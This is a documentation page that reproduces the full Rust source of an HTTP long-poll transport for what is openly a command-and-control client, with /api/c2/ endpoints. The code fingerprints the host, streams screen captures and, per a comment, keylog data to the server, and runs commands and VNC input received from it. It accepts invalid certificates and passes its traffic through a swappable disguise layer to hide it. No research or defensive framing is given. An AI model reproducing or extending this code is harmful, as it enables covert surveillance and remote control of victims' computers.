# http_poll_transport

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/http_poll_transport.rs` |
| **Lines** | 376 |
| **Cards** | T019-networking |
| **Role** | HTTP long-poll transport |

## Internal Functions

- `_unused_hello_marker` (line 374)

## Key Dependencies

- `use anyhow::{Context, Result};`
- `use reqwest::Client;`
- `use tokio::sync::RwLock as TokioRwLock;`
- `use tracing::{debug, info, warn};`
- `use crate::commands::{self, ClientState};`
- `use crate::henge;`
- `use crate::protocol::{`
- `use crate::sysinfo_collect;`

## Full Source

```rust
// HTTP Long-Poll transport.
//
// Upload:   POST /api/c2/up[?sid=<id>]   — binary body (no extra framing)
// Download: GET  /api/c2/down?sid=<id>   — binary body, 204 on timeout
//
// Session ID is received in the X-Session-Id header on the HELLO response.
//
// Henge (変化) integration:
//   Outbound POST body  → henge.encode() → henge.wrap_http_request() → wire
//   Inbound GET body    → henge.unwrap_http_response() → henge.decode() → parse_message()
//   HENGE_PROFILE_UPDATE command → hot-swap profile atomically

use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{Context, Result};
use reqwest::Client;
use tokio::sync::RwLock as TokioRwLock;
use tracing::{debug, info, warn};

use crate::commands::{self, ClientState};
use crate::henge;
use crate::protocol::{
    build_message, parse_message, MSG_COMMAND, MSG_HELLO, MSG_PING, MSG_PONG, MSG_VNC_DATA,
};
use crate::sysinfo_collect;

// ── HTTP-poll-specific Henge helpers ────────────────────────────────────────

/// Wrap an outbound POST body through the Henge transform + HTTP wrapper.
/// Returns (body_bytes, content_type).
async fn henge_wrap_upload(
    henge: &TokioRwLock<henge::HengeProfile>,
    data: Vec<u8>,
) -> (Vec<u8>, String) {
    let profile = henge.read().await;
    if profile.is_raw() {
        return (data, "application/octet-stream".to_string());
    }
    match profile.encode(&data) {
        Ok(encoded) => profile.wrap_http_request(&encoded),
        Err(e) => {
            warn!("[henge] encode failed: {} — sending raw", e);
            (data, "application/octet-stream".to_string())
        }
    }
}

/// Unwrap and decode an inbound GET response body.
async fn henge_unwrap_download(
    henge: &TokioRwLock<henge::HengeProfile>,
    body: Vec<u8>,
    headers: Vec<(String, String)>,
) -> Vec<u8> {
    let profile = henge.read().await;
    if profile.is_raw() {
        return body;
    }
    let extracted = profile.unwrap_http_response(&body, &headers);
    match profile.decode(&extracted) {
        Ok(decoded) => decoded,
        Err(e) => {
            warn!("[henge] decode failed: {} — using raw body", e);
            body
        }
    }
}

pub async fn run_http_poll_session(
    base_url: &str,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()> {
    info!("HTTP-POLL connecting to {}", base_url);

    // --- Step 0: Fetch active Henge profile (best-effort — raw on failure) ---
    let henge_profile = henge::fetch_active_profile(base_url).await;
    info!("[henge] Active profile: {}", henge_profile.name);
    let henge = Arc::new(TokioRwLock::new(henge_profile));

    let client = Client::builder()
        .timeout(Duration::from_secs(35)) // > 30s server-side poll timeout
        .danger_accept_invalid_certs(true) // allow self-signed HTTPS
        .build()
        .context("HTTP client build failed")?;

    // --- Step 1: Send HELLO (Henge-wrapped), get session ID ---
    let (sw, sh, vw, vh, mon_count) = sysinfo_collect::get_screen_dimensions();
    let info = sysinfo_collect::SystemInfo::collect(
        0,
        mon_count,
        sw,
        sh,
        vw,
        vh,
        false,
        false,
        false,
        target_fps,
        jpeg_quality,
        0.0,
        encoding,
    );
    let hello_payload = serde_json::to_vec(&info)?;
    let hello_msg = build_message(MSG_HELLO, &hello_payload);

    // Wrap HELLO through Henge before sending
    let (hello_body, hello_ct) = henge_wrap_upload(&henge, hello_msg).await;

    let up_url = format!("{}/api/c2/up", base_url);
    let resp = client
        .post(&up_url)
        .header("Content-Type", hello_ct)
        .body(hello_body)
        .send()
        .await
        .context("HELLO POST failed")?;

    let session_id = resp
        .headers()
        .get("x-session-id")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
        .context("No X-Session-Id in HELLO response")?;

    info!("HTTP-POLL session established: {}", session_id);

    // --- Step 2: Setup shared state + channels ---
    let (control_tx, mut control_rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
    let (frame_tx, mut frame_rx) = tokio::sync::watch::channel::<Option<Vec<u8>>>(None);

    let state = Arc::new(Mutex::new(ClientState::new(target_fps, jpeg_quality, config_path)));
    {
        let mut st = state.lock().unwrap();
        st.ws_send_tx = Some(control_tx.clone());
        st.current_encoding = encoding.to_string();
    }

    // --- Step 3: Upload task — POST control + frames to /api/c2/up?sid=<id> ---
    let upload_client = client.clone();
    let upload_url = format!("{}/api/c2/up?sid={}", base_url, session_id);
    let henge_upload = henge.clone();
    let upload_task = tokio::spawn(async move {
        let mut control_closed = false;
        let mut frame_closed = false;
        loop {
            tokio::select! {
                biased;

                maybe = control_rx.recv(), if !control_closed => {
                    match maybe {
                        Some(data) => {
                            let (body, ct) = henge_wrap_upload(&henge_upload, data).await;
                            if let Err(e) = upload_client
                                .post(&upload_url)
                                .header("Content-Type", ct)
                                .body(body)
                                .send()
                                .await
                            {
                                warn!("HTTP-POLL upload error: {}", e);
                                break;
                            }
                        }
                        None => control_closed = true,
                    }
                }

                changed = frame_rx.changed(), if !frame_closed => {
                    match changed {
                        Ok(()) => {
                            let frame = frame_rx.borrow().clone();
                            if let Some(data) = frame {
                                let (body, ct) = henge_wrap_upload(&henge_upload, data).await;
                                if let Err(e) = upload_client
                                    .post(&upload_url)
                                    .header("Content-Type", ct)
                                    .body(body)
                                    .send()
                                    .await
                                {
                                    warn!("HTTP-POLL frame upload error: {}", e);
                                    break;
                                }
                            }
                        }
                        Err(_) => frame_closed = true,
                    }
                }
            }
            if control_closed && frame_closed {
                break;
            }
        }
    });

    // --- Step 4: Send loop — capture frames + STATE_SYNC + keylog ---
    let state_clone = state.clone();
    let control_tx_clone = control_tx.clone();
    let frame_tx_clone = frame_tx.clone();
    let encoding_owned = encoding.to_string();
    let send_task = tokio::spawn(async move {
        crate::send_loop(
            state_clone,
            control_tx_clone,
            frame_tx_clone,
            target_fps,
            jpeg_quality,
            encoding_owned,
        )
        .await
    });

    // --- Step 5: Poll task — GET /api/c2/down?sid=<id> ---
    let poll_client = client.clone();
    let down_url = format!("{}/api/c2/down?sid={}", base_url, session_id);
    let state_clone2 = state.clone();
    let control_tx_clone2 = control_tx.clone();
    let henge_poll = henge.clone();
    let poll_task = tokio::spawn(async move {
        loop {
            let resp = match poll_client.get(&down_url).send().await {
                Ok(r) => r,
                Err(e) => {
                    warn!("HTTP-POLL GET error: {}", e);
                    tokio::time::sleep(Duration::from_secs(2)).await;
                    continue;
                }
            };

            match resp.status().as_u16() {
                204 => {
                    // No commands, re-poll immediately
                    debug!("HTTP-POLL: 204 timeout, re-polling");
                    continue;
                }
                200 => {
                    // Collect response headers for Henge data-header extraction
                    let resp_headers: Vec<(String, String)> = resp
                        .headers()
                        .iter()
                        .map(|(k, v)| {
                            (
                                k.as_str().to_owned(),
                                v.to_str().unwrap_or("").to_owned(),
                            )
                        })
                        .collect();

                    let raw_body = match resp.bytes().await {
                        Ok(b) => b.to_vec(),
                        Err(e) => {
                            warn!("HTTP-POLL read body error: {}", e);
                            continue;
                        }
                    };

                    // Henge: unwrap + decode inbound body
                    let raw = henge_unwrap_download(&henge_poll, raw_body, resp_headers).await;

                    if raw.len() < 5 {
                        continue;
                    }

                    let (msg_type, payload) = match parse_message(&raw) {
                        Ok(p) => p,
                        Err(e) => {
                            debug!("HTTP-POLL parse error: {}", e);
                            continue;
                        }
                    };

                    match msg_type {
                        MSG_PING => {
                            let _ = control_tx_clone2.send(build_message(MSG_PONG, &payload));
                        }
                        MSG_VNC_DATA => {
                            let st = state_clone2.lock().unwrap();
                            if let Some(ref vnc) = st.vnc_handle {
                                vnc.feed_rfb_bytes(payload);
                            }
                        }
                        MSG_COMMAND => {
                            let cmd_val: serde_json::Value =
                                match serde_json::from_slice(&payload) {
                                    Ok(v) => v,
                                    Err(_) => continue,
                                };
                            let cmd_type = cmd_val
                                .get("type")
                                .and_then(|v| v.as_str())
                                .unwrap_or("")
                                .to_string();
                            let cmd_payload = cmd_val
                                .get("payload")
                                .and_then(|v| v.as_str())
                                .unwrap_or("")
                                .to_string();
                            let cmd_payload_clean = if let Some(pos) = cmd_payload.find('|') {
                                let prefix = &cmd_payload[..pos];
                                if prefix.chars().all(|c| c.is_ascii_digit()) {
                                    cmd_payload[pos + 1..].to_string()
                                } else {
                                    cmd_payload
                                }
                            } else {
                                cmd_payload
                            };

                            // Henge profile hot-swap — no reconnect needed
                            if cmd_type == "HENGE_PROFILE_UPDATE" {
                                if let Ok(cfg) = serde_json::from_str::<serde_json::Value>(&cmd_payload_clean) {
                                    let new_profile = henge::HengeProfile::from_client_config(&cfg["client_config"]);
                                    let name = new_profile.name.clone();
                                    *henge_poll.write().await = new_profile;
                                    info!("[henge] HTTP-POLL profile updated in-flight: {}", name);
                                }
                                continue;
                            }

                            let response = tokio::task::block_in_place(|| {
                                let mut st = state_clone2.lock().unwrap();
                                commands::handle_command(&mut st, &cmd_type, &cmd_payload_clean)
                            });

                            if let Ok(Some(reply)) = response {
                                let _ = control_tx_clone2.send(reply);
                            }

                            if state_clone2.lock().unwrap().stop_signal {
                                return Ok::<(), anyhow::Error>(());
                            }
                        }
                        _ => {
                            debug!("HTTP-POLL unknown msg type: 0x{:02X}", msg_type);
                        }
                    }
                }
                status => {
                    warn!("HTTP-POLL unexpected status: {}", status);
                    tokio::time::sleep(Duration::from_secs(2)).await;
                }
            }
        }
    });

    tokio::select! {
        r = send_task => {
            if let Err(e) = r { warn!("HTTP-POLL send task panic: {}", e); }
        }
        r = upload_task => {
            if let Err(e) = r { warn!("HTTP-POLL upload panic: {}", e); }
        }
        r = poll_task => {
            match r {
                Ok(Ok(())) => {}
                Ok(Err(e)) => return Err(e),
                Err(e) => warn!("HTTP-POLL poll panic: {}", e),
            }
        }
    }

    {
        let mut st = state.lock().unwrap();
        st.cleanup();
    }
    anyhow::bail!("HTTP-POLL session ended")
}

// Silence unused imports warning in unused-import-check builds.
#[allow(dead_code)]
fn _unused_hello_marker() {
    let _ = MSG_HELLO;
}

```